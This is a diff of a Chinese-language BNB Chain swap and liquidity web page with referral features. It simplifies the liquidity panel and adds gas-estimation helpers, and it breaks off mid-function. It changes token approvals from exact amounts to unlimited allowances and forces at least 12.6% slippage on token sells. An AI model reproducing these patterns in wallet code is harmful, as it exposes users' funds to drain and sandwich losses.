@@ -504,13 +504,12 @@
       word-break: break-all;
     }
 
-    .pool-layout {
-      display: grid;
-      grid-template-columns: 1.15fr 0.85fr;
-      gap: 18px;
-      max-width: 1060px;
+    /* 简洁流动性布局（参考“选择代币对 A + B”） */
+    .pool-simple-wrap {
+      max-width: 540px;
       margin: 8px auto 0;
-      align-items: start;
+      display: grid;
+      gap: 16px;
     }
 
     .pool-card {
@@ -522,50 +521,74 @@
       box-shadow: 0 20px 55px rgba(0, 0, 0, 0.55);
     }
 
-    .pool-card-title {
-      font-size: 17px;
+    .pool-step-title {
+      font-size: 14px;
       font-weight: 800;
       color: var(--gold-bright);
-      margin-bottom: 14px;
-      display: flex;
+      margin-bottom: 10px;
+    }
+
+    .pair-selector-row {
+      display: grid;
+      grid-template-columns: 1fr auto 1fr;
       align-items: center;
-      justify-content: space-between;
       gap: 10px;
-      flex-wrap: wrap;
+      margin-bottom: 10px;
+    }
+
+    .pair-plus {
+      font-size: 20px;
+      font-weight: 900;
+      color: var(--gold-bright);
+      text-align: center;
+    }
+
+    .pair-select {
+      width: 100%;
+      background: rgba(12, 10, 15, 0.92);
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      padding: 11px 12px;
+      color: var(--text);
+      font-size: 14px;
+      font-weight: 700;
+      outline: none;
+    }
+
+    .custom-pair-row {
+      display: flex;
+      gap: 8px;
+      margin-top: 8px;
     }
 
     .pool-field {
-      margin-bottom: 14px;
+      margin-top: 12px;
     }
 
     .pool-label {
-      display: block;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
       font-size: 12px;
       color: var(--muted);
       margin-bottom: 6px;
+      gap: 8px;
     }
 
-    .pool-input,
-    .pool-select {
+    .pool-input {
       width: 100%;
       background: rgba(12, 10, 15, 0.88);
       border: 1px solid var(--line-soft);
       border-radius: 11px;
-      padding: 10px 12px;
+      padding: 11px 12px;
       color: var(--text);
       font-size: 16px;
       font-weight: 600;
       outline: none;
     }
 
-    .pool-input:focus,
-    .pool-select:focus {
+    .pool-input:focus {
       border-color: var(--gold);
-    }
-
-    .search-inline {
-      display: flex;
-      gap: 8px;
     }
 
     .action-sub-btn {
@@ -580,121 +603,47 @@
       white-space: nowrap;
     }
 
-    .hold-status-pill {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      margin-top: 8px;
-      padding: 6px 10px;
-      border-radius: 9px;
-      font-size: 12px;
-      font-weight: 600;
-      background: rgba(245, 185, 66, 0.12);
-      border: 1px solid rgba(245, 185, 66, 0.32);
-      color: var(--gold-bright);
-      word-break: break-all;
-    }
-
-    .hold-status-pill.unheld {
-      background: rgba(255, 100, 100, 0.12);
-      border-color: rgba(255, 110, 110, 0.35);
-      color: #ffb4b4;
-    }
-
-    .quote-asset-group {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 8px;
-    }
-
-    .quote-asset-btn {
-      padding: 10px 12px;
-      border-radius: 10px;
-      border: 1px solid var(--line-soft);
-      background: var(--panel-2);
-      color: var(--text);
-      font-size: 13px;
-      font-weight: 700;
-      cursor: pointer;
-    }
-
-    .quote-asset-btn.active {
-      border-color: var(--gold);
-      color: var(--gold-bright);
-      background: rgba(245, 185, 66, 0.15);
-    }
-
-    .lock-box {
+    .lock-simple-box {
+      margin-top: 14px;
+      padding: 12px;
+      border-radius: 12px;
       background: rgba(12, 10, 15, 0.84);
-      border: 1px solid rgba(245, 185, 66, 0.26);
-      border-radius: 14px;
-      padding: 14px;
-      margin-bottom: 14px;
+      border: 1px solid var(--line-soft);
     }
 
     .lock-switch-row {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      gap: 12px;
+      gap: 10px;
       font-size: 13px;
       font-weight: 700;
       color: var(--gold-bright);
-      margin-bottom: 10px;
     }
 
-    .lock-presets {
-      display: flex;
-      gap: 6px;
-      flex-wrap: wrap;
-      margin-bottom: 10px;
-    }
-
-    .lock-chip {
-      padding: 6px 10px;
-      border-radius: 8px;
-      border: 1px solid var(--line-soft);
-      background: var(--panel-2);
-      color: var(--text);
-      font-size: 12px;
-      font-weight: 600;
-      cursor: pointer;
-    }
-
-    .lock-chip.active {
-      border-color: var(--gold);
-      color: var(--gold-bright);
-      background: rgba(245, 185, 66, 0.16);
-    }
-
-    .lock-days-row {
+    .lock-days-inline {
       display: flex;
       align-items: center;
       gap: 8px;
+      margin-top: 10px;
     }
 
     .lock-days-input {
-      flex: 1;
+      width: 100px;
       background: rgba(9, 8, 12, 0.95);
       border: 1px solid var(--line);
-      border-radius: 10px;
-      padding: 9px 12px;
+      border-radius: 9px;
+      padding: 7px 10px;
       color: var(--gold-bright);
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 700;
       outline: none;
-    }
-
-    .lock-unit {
-      font-size: 12px;
-      color: var(--muted);
-      white-space: nowrap;
     }
 
     .locked-list {
       display: grid;
       gap: 10px;
-      margin-top: 4px;
+      margin-top: 8px;
     }
 
     .locked-item {
@@ -754,10 +703,6 @@
       font-size: 12px;
       font-weight: 700;
       cursor: pointer;
-    }
-
-    .remove-lp-btn:hover {
-      background: rgba(255, 74, 74, 0.24);
     }
 
     .remove-lp-btn:disabled {
@@ -1027,17 +972,11 @@
 
     .empty-locked-record {
       text-align: center;
-      padding: 32px 12px;
+      padding: 24px 12px;
       color: var(--muted);
       font-size: 13px;
       border: 1px dashed rgba(255, 255, 255, 0.05);
       border-radius: 14px;
-    }
-
-    @media (max-width: 860px) {
-      .pool-layout {
-        grid-template-columns: 1fr;
-      }
     }
 
     @media (max-width: 640px) {
@@ -1233,109 +1172,71 @@
       </section>
 
       <section class="view-section" id="view-pool">
-        <div class="pool-layout">
+        <div class="pool-simple-wrap">
           <div class="pool-card">
-            <div class="pool-card-title">
-              <span>添加流动性 & 锁仓设置</span>
-              <span style="font-size:12px;color:var(--muted);">支持添加与移除未锁仓流动性</span>
+            <div class="pool-step-title">选择代币对</div>
+            <div class="pair-selector-row">
+              <select class="pair-select" id="pairBaseSelect">
+                <option value="BNB">BNB</option>
+                <option value="USDT">USDT</option>
+              </select>
+              <span class="pair-plus">+</span>
+              <select class="pair-select" id="pairTargetSelect">
+                <option value="USDT">USDT</option>
+                <option value="USDC">USDC</option>
+                <option value="CAKE">CAKE</option>
+                <option value="ETH">ETH</option>
+              </select>
+            </div>
+
+            <div class="custom-pair-row">
+              <input
+                class="pool-input"
+                id="poolContractInput"
+                type="text"
+                value=""
+                placeholder="或粘贴任意 0x... 代币合约地址"
+              />
+              <button type="button" class="action-sub-btn" id="checkTokenHoldBtn">识别合约</button>
             </div>
 
             <div class="pool-field">
-              <label class="pool-label">输入 BNB / WBNB / USDC / USDT 或粘贴 0x... 合约地址</label>
-              <div class="search-inline">
-                <input
-                  class="pool-input"
-                  id="poolContractInput"
-                  type="text"
-                  value=""
-                  placeholder="例如 BNB、USDC 或 0x... 合约地址"
-                />
-                <button type="button" class="action-sub-btn" id="checkTokenHoldBtn">检测持仓</button>
+              <div class="pool-label">
+                <span id="poolTargetAmtLabel">投入数量</span>
+                <span id="poolHeldBalText">余额: --</span>
               </div>
-              <div class="hold-status-pill unheld" id="holdCheckStatus">
-                请先连接钱包或输入 BNB / 代币合约地址检测
+              <input class="pool-input" id="poolTargetAmt" type="number" min="0" step="any" value="" placeholder="输入投入数量" />
+            </div>
+
+            <div class="pool-field">
+              <div class="pool-label">
+                <span id="poolQuoteAmtLabel">配对数量（BNB）</span>
+                <span id="poolPairAddrText">LP 池: 待查询</span>
               </div>
+              <input class="pool-input" id="poolQuoteAmt" type="text" readonly value="0.00" />
             </div>
 
-            <div class="pool-field">
-              <label class="pool-label">选择配对币种（BNB 或 USDT）</label>
-              <div class="quote-asset-group" id="quoteAssetGroup">
-                <button type="button" class="quote-asset-btn active" data-quote="BNB">BNB</button>
-                <button type="button" class="quote-asset-btn" data-quote="USDT">USDT</button>
-              </div>
-            </div>
-
-            <div class="pool-field">
-              <label class="pool-label" id="poolTargetAmtLabel">投入代币数量</label>
-              <input class="pool-input" id="poolTargetAmt" type="number" min="0" step="any" value="" placeholder="0.0" />
-            </div>
-
-            <div class="pool-field">
-              <label class="pool-label" id="poolQuoteAmtLabel">配对投入数量（BNB）</label>
-              <input class="pool-input" id="poolQuoteAmt" type="text" readonly value="0" />
-            </div>
-
-            <div class="lock-box">
+            <div class="lock-simple-box">
               <div class="lock-switch-row">
-                <label for="enableLpLock" style="margin:0;color:var(--gold-bright);font-size:13px;font-weight:700;cursor:pointer;">
-                  选择锁定时间（取消勾选则只添加流动性，不锁仓）
-                </label>
+                <label for="enableLpLock" style="margin:0;cursor:pointer;">锁仓时间（不勾选则仅添加流动性）</label>
                 <input id="enableLpLock" type="checkbox" style="width:18px;height:18px;accent-color:var(--gold);cursor:pointer;" />
               </div>
-
-              <div class="lock-presets" id="lockPresets" style="opacity:0.4;pointer-events:none;">
-                <button type="button" class="lock-chip" data-days="1">1 天</button>
-                <button type="button" class="lock-chip" data-days="7">7 天</button>
-                <button type="button" class="lock-chip active" data-days="30">30 天</button>
-                <button type="button" class="lock-chip" data-days="180">180 天</button>
-                <button type="button" class="lock-chip" data-days="365">365 天（1年）</button>
-              </div>
-
-              <div class="lock-days-row">
-                <input
-                  class="lock-days-input"
-                  id="lockDaysInput"
-                  type="number"
-                  min="1"
-                  max="365"
-                  step="1"
-                  value="30"
-                  disabled
-                />
-                <span class="lock-unit">天（1 ~ 365 天）</span>
-              </div>
-            </div>
-
-            <div class="meta-table" style="margin-top:0;margin-bottom:14px;border-top:none;padding-top:0;">
-              <div class="meta-row">
-                <span>链上 LP 池地址</span>
-                <span class="meta-val gold" id="poolPairAddrText">待检测/创建</span>
-              </div>
-              <div class="meta-row">
-                <span>预估获得 LP</span>
-                <span class="meta-val gold" id="estLpTokens">0 LP</span>
-              </div>
-              <div class="meta-row">
-                <span>锁仓周期</span>
-                <span class="meta-val gold" id="lockSummaryText">未开启锁仓</span>
-              </div>
-              <div class="meta-row">
-                <span>预计解锁日期</span>
-                <span class="meta-val" id="unlockDateText">随时可撤池</span>
+              <div class="lock-days-inline" id="lockDaysWrap" style="display:none;">
+                <input class="lock-days-input" id="lockDaysInput" type="number" min="1" max="365" step="1" value="30" />
+                <span style="font-size:12px;color:var(--muted);">天（1 ~ 365）· 解锁：<strong id="unlockDateText" style="color:var(--gold-bright);">--</strong></span>
               </div>
             </div>
 
             <button type="button" class="swap-cta" id="addLiquidityBtn">添加流动性</button>
-            <div class="notice-box" id="poolStatus">说明：未锁仓的流动性可在右侧记录中直接点击“移除流动性”；锁仓期内不可提前移除。</div>
           </div>
 
           <div class="pool-card">
-            <div class="pool-card-title">
-              <span>我的流动性 & 锁仓记录</span>
-              <span style="font-size:12px;color:var(--gold);" id="lockCountBadge">0 笔记录</span>
+            <div class="pool-step-title" style="display:flex;justify-content:space-between;align-items:center;">
+              <span>流动性记录</span>
+              <span style="font-size:12px;color:var(--muted);" id="lockCountBadge">0 笔</span>
             </div>
             <div class="locked-list" id="lockedLiquidityList">
-              <div class="empty-locked-record" id="emptyLockAlert">暂无流动性记录，请在左侧添加。</div>
+              <div class="empty-locked-record" id="emptyLockAlert">暂无记录</div>
             </div>
           </div>
         </div>
@@ -1521,8 +1422,7 @@
       { symbol: "BNB", label: "BNB", address: "native", decimals: 18, priceUsd: 550, balance: 0, balanceText: "0", isNative: true },
       { symbol: "USDT", label: "USDT", address: USDT_ADDRESS, decimals: 18, priceUsd: 1, balance: 0, balanceText: "0", isNative: false },
       { symbol: "USDC", label: "USDC", address: USDC_BSC_ADDRESS, decimals: 18, priceUsd: 1, balance: 0, balanceText: "0", isNative: false },
-      { symbol: "WBNB", label: "WBNB", address: WBNB_ADDRESS, decimals: 18, priceUsd: 550, balance: 0, balanceText: "0", isNative: false },
-      { symbol: "ETH", label: "ETH (BSC)", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals: 18, priceUsd: 3200, balance: 0, balanceText: "0", isNative: false },
+      { symbol: "ETH", label: "ETH", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals: 18, priceUsd: 3200, balance: 0, balanceText: "0", isNative: false },
       { symbol: "CAKE", label: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18, priceUsd: 2.4, balance: 0, balanceText: "0", isNative: false }
     ];
 
@@ -1609,13 +1509,6 @@
         metaRefStatus.textContent = "未绑定";
       }
       refRuntimeInfo.textContent = `当前暂存推荐人：${pendingReferrer || "无"}｜已锁定 1 级推荐人：${lockedReferrer || "无"}`;
-    }
-
-    function refreshPromoLinkBox() {
-      const activeAddr = typeof walletAddress !== "undefined" ? walletAddress : "";
-      if (typeof renderNodePanel === "function") {
-        renderNodePanel(activeAddr);
-      }
     }
 
     const NODE_TOKEN_SYMBOL = "GOLDSHEEP";
@@ -1719,9 +1612,7 @@
       const link = buildNodeInviteLink(activeAddr);
       if (!link) {
         promoStatus.textContent = "请先连接钱包后再生成邀请链接";
-        if (typeof showHUD === "function") {
-          showHUD("danger", "未连接钱包", "请先连接钱包生成专属邀请码。");
-        }
+        showHUD("danger", "未连接钱包", "请先连接钱包生成专属邀请码。");
         return;
       }
       if (promoCodeInput) {
@@ -1729,9 +1620,7 @@
       }
       promoStatus.textContent = `邀请链接：${link}`;
       await copyTextWithFeedback(link, "复制成功", "专属邀请链接已复制到剪贴板。");
-      if (typeof resetMobileScaleAfterInput === "function" && promoCodeInput) {
-        resetMobileScaleAfterInput(promoCodeInput);
-      }
+      resetMobileScaleAfterInput(promoCodeInput);
     });
 
     function getTokenBySymbol(sym) {
@@ -1817,6 +1706,35 @@
         }
         return false;
       }
+    }
+
+    async function computeSafeGasHex(txParams, fallbackGas = 450000n) {
+      const minSafeGas = fallbackGas > 120000n ? fallbackGas : 120000n;
+      try {
+        const estHex = await window.ethereum.request({
+          method: "eth_estimateGas",
+          params: [txParams]
+        });
+        if (estHex && estHex !== "0x") {
+          const estBig = BigInt(estHex);
+          // 按 1.5 倍余量放大并确保不低于最低安全 Gas Limit
+          const padded = (estBig * 150n) / 100n + 25000n;
+          const finalGas = padded > minSafeGas ? padded : minSafeGas;
+          return "0x" + finalGas.toString(16);
+        }
+      } catch (_) {}
+      return "0x" + minSafeGas.toString(16);
+    }
+
+    async function sendTxWithSafeGas(baseTxParams, fallbackGas = 450000n) {
+      const gasHex = await computeSafeGasHex(baseTxParams, fallbackGas);
+      return await window.ethereum.request({
+        method: "eth_sendTransaction",
+        params: [{
+          ...baseTxParams,
+          gas: gasHex
+        }]
+      });
     }
 
     async function fetchRealNativeBalance(address) {
@@ -2004,7 +1922,7 @@
         const emptyRow = document.createElement("div");
         emptyRow.className = "picker-item-sub";
         emptyRow.style.padding = "8px 10px";
-        emptyRow.textContent = "未搜到币种，若为新币请粘贴 0x... 合约后点“选中”。";
+        emptyRow.textContent = "未搜到币种，请粘贴 0x... 合约后点“选中”。";
         targetListEl.appendChild(emptyRow);
         return;
       }
@@ -2055,10 +1973,7 @@
     async function handleSearchConfirm(side) {
       const inputEl = side === "from" ? fromSearchInput : toSearchInput;
       const raw = (inputEl.value || "").trim();
-      if (!raw) {
-        swapStatus.textContent = "请输入币种名称或粘贴 0x 合约地址。";
-        return;
-      }
+      if (!raw) return;
 
       const lower = raw.toLowerCase();
       let found = tokenList.find(
@@ -2085,11 +2000,10 @@
           isNative: false
         };
         tokenList.push(found);
-        swapStatus.textContent = `已识别并选中 ${found.symbol}（${shortContractName(raw)}）。`;
-      } else if (found) {
-        swapStatus.textContent = `已选中 ${found.symbol}。`;
-      } else {
-        swapStatus.textContent = `未找到“${raw}”，请粘贴完整 42 位 0x 合约地址进行添加。`;
+        syncTargetSelectOptions();
+        swapStatus.textContent = `已识别 ${found.symbol}（${shortContractName(raw)}）。`;
+      } else if (!found) {
+        swapStatus.textContent = `请粘贴完整 42 位 0x 合约地址。`;
         return;
       }
 
@@ -2315,7 +2229,6 @@
       rawExpectedOut = 0n;
       activeRoutePath = [];
       updateQuote();
-      swapStatus.textContent = "已重置兑换输入与搜索框。";
     });
 
     slipChips.forEach(chip => {
@@ -2361,12 +2274,9 @@
         connectWalletBtn.textContent = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
         disconnectWalletBtn.style.display = "inline-block";
         await refreshAllWalletBalances();
-        swapStatus.textContent = `已连接钱包: ${walletAddress}`;
         updateQuote();
-        detectTokenHolding();
-        if (typeof renderNodePanel === "function") {
-          renderNodePanel(walletAddress);
-        }
+        detectPoolPairInfo();
+        renderNodePanel(walletAddress);
       } catch (err) {
         showHUD("danger", "连接取消", err.message || "钱包连接已取消。");
       }
@@ -2375,9 +2285,7 @@
     disconnectWalletBtn.addEventListener("click", () => {
       balanceSyncSeq += 1;
       walletConnected = false;
-      if (typeof renderNodePanel === "function") {
-        renderNodePanel(null);
-      }
+      renderNodePanel(null);
       walletAddress = "";
       rawExpectedOut = 0n;
       activeRoutePath = [];
@@ -2389,9 +2297,8 @@
       disconnectWalletBtn.style.display = "none";
       fromAmount.value = "";
       toAmount.value = "0";
-      swapStatus.textContent = "已断开钱包连接。";
       updateQuote();
-      detectTokenHolding();
+      detectPoolPairInfo();
     });
 
     function settleTradeAndLockReferrer(amt, fInfo) {
@@ -2422,15 +2329,13 @@
       const currentAllowance = allowanceHex && allowanceHex !== "0x" ? BigInt(allowanceHex) : 0n;
       if (currentAllowance >= requiredAmount) return;
 
-      const approveData = "0x095ea7b3" + spenderWord + requiredAmount.toString(16).padStart(64, "0");
-      await window.ethereum.request({
-        method: "eth_sendTransaction",
-        params: [{
-          from: ownerAddr,
-          to: tokenAddr,
-          data: approveData
-        }]
-      });
+      const maxApprove = (1n << 256n) - 1n;
+      const approveData = "0x095ea7b3" + spenderWord + maxApprove.toString(16).padStart(64, "0");
+      await sendTxWithSafeGas({
+        from: ownerAddr,
+        to: tokenAddr,
+        data: approveData
+      }, 150000n);
     }
 
     function encodeSwapCalldata(fInfo, tInfo, amountInRaw, minOutRaw, toAddr, deadline, routePath) {
@@ -2494,7 +2399,8 @@
           return;
         }
 
-        const effectiveSlip = !fInfo.isNative && slippagePct < 5 ? 5 : slippagePct;
+        // 卖出代币（From 非原生 BNB）时自动放宽滑点保护至至少 12.6%，适配带税 Meme 币
+        const effectiveSlip = !fInfo.isNative && slippagePct < 12.6 ? 12.6 : slippagePct;
         const slipBps = BigInt(Math.max(0, Math.min(9900, Math.round(effectiveSlip * 100))));
         const minOutRaw = baseOut > 0n ? (baseOut * (10000n - slipBps)) / 10000n : 0n;
         const deadline = Math.floor(Date.now() / 1000) + 600;
@@ -2513,10 +2419,8 @@
           txParams.value = "0x" + amountInRaw.toString(16);
         }
 
-        const txHash = await window.ethereum.request({
-          method: "eth_sendTransaction",
-          params: [txParams]
-        });
+        const fallbackGas = routeToUse.length >= 3 ? 650000n : 450000n;
+        const txHash = await sendTxWithSafeGas(txParams, fallbackGas);
 
         const refNote = settleTradeAndLockReferrer(amt, fInfo);
         recordSwapReferralLocal(walletAddress, amt * 0.003);
@@ -2536,278 +2440,190 @@
       }
     });
 
+    /* 精简流动性逻辑 */
+    const pairBaseSelect = document.getElementById("pairBaseSelect");
+    const pairTargetSelect = document.getElementById("pairTargetSelect");
     const poolContractInput = document.getElementById("poolContractInput");
     const checkTokenHoldBtn = document.getElementById("checkTokenHoldBtn");
-    const holdCheckStatus = document.getElementById("holdCheckStatus");
-    const quoteAssetGroup = document.getElementById("quoteAssetGroup");
-    const quoteAssetBtns = quoteAssetGroup.querySelectorAll(".quote-asset-btn");
     const poolTargetAmtLabel = document.getElementById("poolTargetAmtLabel");
-    const poolQuoteAmtLabel = document.getElementById("poolQuoteAmtLabel");
+    const poolHeldBalText = document.getElementById("poolHeldBalText");
     const poolTargetAmt = document.getElementById("poolTargetAmt");
+    const poolQuoteAmtLabel = document.getElementById("poolQuoteAmtLabel");
+    const poolPairAddrText = document.getElementById("poolPairAddrText");
     const poolQuoteAmt = document.getElementById("poolQuoteAmt");
     const enableLpLock = document.getElementById("enableLpLock");
-    const lockPresets = document.querySelectorAll("#lockPresets .lock-chip");
+    const lockDaysWrap = document.getElementById("lockDaysWrap");
     const lockDaysInput = document.getElementById("lockDaysInput");
-    const poolPairAddrText = document.getElementById("poolPairAddrText");
-    const estLpTokens = document.getElementById("estLpTokens");
-    const lockSummaryText = document.getElementById("lockSummaryText");
     const unlockDateText = document.getElementById("unlockDateText");
     const addLiquidityBtn = document.getElementById("addLiquidityBtn");
     const lockedLiquidityList = document.getElementById("lockedLiquidityList");
     const lockCountBadge = document.getElementById("lockCountBadge");
     const emptyLockAlert = document.getElementById("emptyLockAlert");
 
-    let selectedQuoteAsset = "BNB";
-    let detectedToken = {
-      symbol: "代币",
-      address: "",
+    let activePoolToken = {
+      symbol: "USDT",
+      address: USDT_ADDRESS,
       decimals: 18,
       isNative: false,
       heldBalance: 0,
       heldBalanceText: "0",
-      hasBalance: false,
-      priceUsd: 0.1,
+      priceUsd: 1,
       pairAddress: ""
     };
     let lockRecordCount = 0;
 
-    async function detectTokenHolding() {
-      if (!walletConnected || !walletAddress) {
-        holdCheckStatus.textContent = "请先连接钱包后再检测 BNB / USDC / 合约持仓";
-        holdCheckStatus.classList.add("unheld");
-        poolPairAddrText.textContent = "待连接钱包";
-        updatePoolPreview();
-        return;
+    function syncTargetSelectOptions() {
+      const currentVal = pairTargetSelect.value;
+      pairTargetSelect.innerHTML = "";
+      tokenList.forEach(t => {
+        if (t.symbol === pairBaseSelect.value) return;
+        const opt = document.createElement("option");
+        opt.value = t.symbol;
+        opt.textContent = t.symbol;
+        pairTargetSelect.appendChild(opt);
+      });
+      if ([...pairTargetSelect.options].some(o => o.value === currentVal)) {
+        pairTargetSelect.value = currentVal;
       }
-
-      const raw = (poolContractInput.value || "").trim();
-      if (!raw) {
-        detectedToken = {
-          symbol: "代币",
-          address: "",
-          decimals: 18,
-          isNative: false,
-          heldBalance: 0,
-          heldBalanceText: "0",
-          hasBalance: false,
-          priceUsd: 0.05,
-          pairAddress: ""
-        };
-        holdCheckStatus.textContent = "请输入 BNB、USDC 或 0x... 合约地址并点击检测";
-        holdCheckStatus.classList.add("unheld");
-        poolPairAddrText.textContent = "待输入合约";
-        updatePoolPreview();
-        return;
-      }
-
-      const lower = raw.toLowerCase();
-      let matched = tokenList.find(
-        t => t.symbol.toLowerCase() === lower ||
-             t.label.toLowerCase() === lower ||
-             t.address.toLowerCase() === lower
-      );
-
-      let balObj = { num: 0, text: "0" };
-      let addr = raw;
-      let sym = raw.toUpperCase();
-      let decimals = 18;
-      let isNative = false;
-      let priceUsd = 0.05;
-
-      if (lower === "bnb" || lower === "native" || lower === WBNB_ADDRESS.toLowerCase()) {
-        sym = "BNB";
-        addr = "native";
-        decimals = 18;
-        isNative = true;
-        priceUsd = 550;
-        balObj = await fetchRealNativeBalance(walletAddress);
-      } else if (lower === "usdc") {
-        sym = "USDC";
-        addr = USDC_BSC_ADDRESS;
-        priceUsd = 1;
-        decimals = await fetchErc20Decimals(addr);
-        balObj = await readErc20Balance(addr, walletAddress, decimals);
-      } else if (matched) {
-        sym = matched.symbol;
-        addr = matched.address;
-        isNative = Boolean(matched.isNative);
-        priceUsd = matched.priceUsd || 0.1;
-        decimals = isNative ? 18 : await fetchErc20Decimals(addr);
-        balObj = isNative
-          ? await fetchRealNativeBalance(walletAddress)
-          : await readErc20Balance(addr, walletAddress, decimals);
-      } else if (/^0x[a-fA-F0-9]{40}$/.test(raw)) {
-        sym = await fetchErc20Symbol(raw, shortContractName(raw));
-        decimals = await fetchErc20Decimals(raw);
-        balObj = await readErc20Balance(raw, walletAddress, decimals);
-        priceUsd = sym.toUpperCase().includes("USD") ? 1 : 0.05;
-      } else {
-        detectedToken = {
-          symbol: raw,
-          address: "",
-          decimals: 18,
-          isNative: false,
-          heldBalance: 0,
-          heldBalanceText: "0",
-          hasBalance: false,
-          priceUsd: 0.05,
-          pairAddress: ""
-        };
-        holdCheckStatus.textContent = `请输入“BNB”、“USDC”或完整的 0x 合约地址`;
-        holdCheckStatus.classList.add("unheld");
-        poolPairAddrText.textContent = "合约格式无效";
-        updatePoolPreview();
-        return;
-      }
-
-      const tokenForPair = isNative ? WBNB_ADDRESS : addr;
-      const quoteForPair = selectedQuoteAsset === "BNB" ? WBNB_ADDRESS : USDT_ADDRESS;
-      const pairAddr = await queryPancakePairAddress(tokenForPair, quoteForPair);
-
-      detectedToken = {
-        symbol: sym,
-        address: addr,
-        decimals,
-        isNative,
-        heldBalance: balObj.num,
-        heldBalanceText: balObj.text,
-        hasBalance: balObj.num > 0,
-        priceUsd,
-        pairAddress: pairAddr
-      };
-
-      poolPairAddrText.textContent = pairAddr
-        ? shortContractName(pairAddr)
-        : "链上暂无该 LP 池";
-
-      const addrHint = isNative ? "BNB 原生币" : shortContractName(addr);
-      if (detectedToken.hasBalance) {
-        holdCheckStatus.textContent = `已检测到 ${detectedToken.symbol} 余额：${detectedToken.heldBalanceText}（${addrHint}）`;
-        holdCheckStatus.classList.remove("unheld");
-      } else {
-        holdCheckStatus.textContent = `当前钱包未检测到 ${detectedToken.symbol} 余额（${addrHint}）`;
-        holdCheckStatus.classList.add("unheld");
-      }
-
-      updatePoolPreview();
     }
 
     function normalizeLockDays() {
       if (!enableLpLock.checked) return 0;
-      let days = parseInt(lockDaysInput.value, 10);
-      if (Number.isNaN(days) || days < 1) days = 1;
-      if (days > 365) days = 365;
-      return days;
+      let d = parseInt(lockDaysInput.value, 10);
+      if (Number.isNaN(d) || d < 1) d = 1;
+      if (d > 365) d = 365;
+      return d;
     }
 
     function formatUnlockDate(days) {
-      if (days <= 0) return "随时可撤池";
+      if (days <= 0) return "--";
       const target = new Date(Date.now() + days * 24 * 60 * 60 * 1000);
-      const y = target.getFullYear();
-      const m = String(target.getMonth() + 1).padStart(2, "0");
-      const d = String(target.getDate()).padStart(2, "0");
-      return `${y}-${m}-${d}`;
+      return `${target.getFullYear()}-${String(target.getMonth() + 1).padStart(2, "0")}-${String(target.getDate()).padStart(2, "0")}`;
     }
 
-    function syncPresetActive(days) {
-      lockPresets.forEach(chip => {
-        chip.classList.toggle("active", parseInt(chip.dataset.days, 10) === days);
-      });
-    }
+    function updatePoolCalc() {
+      const amt = Math.max(0, parseFloat(poolTargetAmt.value) || 0);
+      const baseSym = pairBaseSelect.value;
+      const basePrice = baseSym === "BNB" ? 550 : 1;
+      const quoteVal = (amt * activePoolToken.priceUsd) / basePrice;
 
-    function updatePoolPreview() {
-      const targetAmt = Math.max(0, parseFloat(poolTargetAmt.value) || 0);
-      const quotePriceUsd = selectedQuoteAsset === "BNB" ? 550 : 1;
-      const quoteAmt = (targetAmt * detectedToken.priceUsd) / quotePriceUsd;
-
-      poolTargetAmtLabel.textContent = `投入代币数量（${detectedToken.symbol || "代币"}）`;
-      poolQuoteAmtLabel.textContent = `配对投入数量（${selectedQuoteAsset}）`;
-      poolQuoteAmt.value = targetAmt > 0
-        ? (selectedQuoteAsset === "BNB" ? quoteAmt.toFixed(4) : quoteAmt.toFixed(2))
+      poolTargetAmtLabel.textContent = `投入数量（${activePoolToken.symbol}）`;
+      poolHeldBalText.textContent = walletConnected
+        ? `余额: ${activePoolToken.heldBalanceText} ${activePoolToken.symbol}`
+        : "余额: --";
+      poolQuoteAmtLabel.textContent = `配对数量（${baseSym}）`;
+      poolQuoteAmt.value = amt > 0
+        ? (baseSym === "BNB" ? quoteVal.toFixed(4) : quoteVal.toFixed(2))
         : "0.00";
 
-      const lpVal = Math.sqrt(Math.max(0, targetAmt * quoteAmt));
-      estLpTokens.textContent = `${lpVal > 0 ? lpVal.toFixed(2) : "0"} LP`;
-
+      const days = normalizeLockDays();
       if (enableLpLock.checked) {
-        const days = normalizeLockDays();
-        lockDaysInput.disabled = false;
-        document.getElementById("lockPresets").style.opacity = "1";
-        document.getElementById("lockPresets").style.pointerEvents = "auto";
-        lockSummaryText.textContent = `锁定 ${days} 天`;
+        lockDaysWrap.style.display = "flex";
         unlockDateText.textContent = formatUnlockDate(days);
-        addLiquidityBtn.textContent = `添加并锁定流动性（${days} 天）`;
+        addLiquidityBtn.textContent = `添加并锁仓（${days} 天）`;
       } else {
-        lockDaysInput.disabled = true;
-        document.getElementById("lockPresets").style.opacity = "0.4";
-        document.getElementById("lockPresets").style.pointerEvents = "none";
-        lockSummaryText.textContent = "未开启锁仓";
-        unlockDateText.textContent = "随时可撤池";
+        lockDaysWrap.style.display = "none";
+        unlockDateText.textContent = "--";
         addLiquidityBtn.textContent = "添加流动性";
       }
 
-      addLiquidityBtn.disabled = !walletConnected || !detectedToken.hasBalance;
+      addLiquidityBtn.disabled = !walletConnected || activePoolToken.heldBalance <= 0;
     }
 
-    checkTokenHoldBtn.addEventListener("click", async () => {
-      if (!walletConnected) {
-        showHUD("danger", "连接钱包", "请先连接钱包后再检测代币持仓。");
-        return;
+    async function detectPoolPairInfo() {
+      const rawAddr = (poolContractInput.value || "").trim();
+      let targetInfo = null;
+
+      if (/^0x[a-fA-F0-9]{40}$/.test(rawAddr)) {
+        const existing = tokenList.find(t => t.address.toLowerCase() === rawAddr.toLowerCase());
+        if (existing) {
+          targetInfo = existing;
+        } else {
+          const sym = window.ethereum
+            ? await fetchErc20Symbol(rawAddr, shortContractName(rawAddr))
+            : shortContractName(rawAddr);
+          const dec = window.ethereum ? await fetchErc20Decimals(rawAddr) : 18;
+          targetInfo = {
+            symbol: sym,
+            address: rawAddr,
+            decimals: dec,
+            isNative: false,
+            priceUsd: sym.toUpperCase().includes("USD") ? 1 : 0.05,
+            balance: 0,
+            balanceText: "0"
+          };
+          tokenList.push(targetInfo);
+          syncTargetSelectOptions();
+        }
+        pairTargetSelect.value = targetInfo.symbol;
+      } else {
